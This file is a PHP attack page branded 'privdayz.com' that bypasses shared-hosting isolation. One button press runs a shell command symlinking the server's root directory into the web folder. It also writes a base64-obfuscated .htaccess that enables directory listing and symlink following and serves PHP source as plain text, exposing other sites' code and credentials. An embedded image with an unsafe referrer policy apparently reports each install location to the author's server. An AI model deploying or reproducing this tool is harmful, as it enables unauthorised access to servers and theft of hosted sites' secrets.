<head>
<title>byp4ss r00t p4th by privdayz.com</title>
</head>
<style type="text/css"><!-- body {background-color: #151515; font-family:Courier	
margin-left: 0px; margin-top: 0px; text-align: center; New;font-size:12px;color:#009900;font-weight:400;} 
a{text-decoration:none;} a:link {color:#009900;} a:visited {color:#008080;} a:hover{color:#ff0000;} a:active {color:#00a2a2;} 
--></style>
<link href="https://privdayz.com/wp-content/themes/privdaysv1/hacker.css" rel="stylesheet"><center><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url"/></center>
<br><br><body bgColor="151515"><tr><td>
<?php 
echo "<form method='POST' action=''>" ; echo "
<center><input type='submit' value='bypass it' name='domains'></center>"; 
if (isset($_POST['domains'])){ system('ln -s / domains.txt'); 
$fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw'; 
$file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $domains = symlink("/","domains.txt"); 
$rt="<br><a href=domains.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
bypassed successfully</b></font></a><br><br><iframe src='domains.txt' width='600' height='300'></iframe>"; 
echo "<br><br><b>done.. </b><br><br>Check link given below for / folder symlink <br>$rt</center>";} echo "</form>";  ?></td></tr></body></html>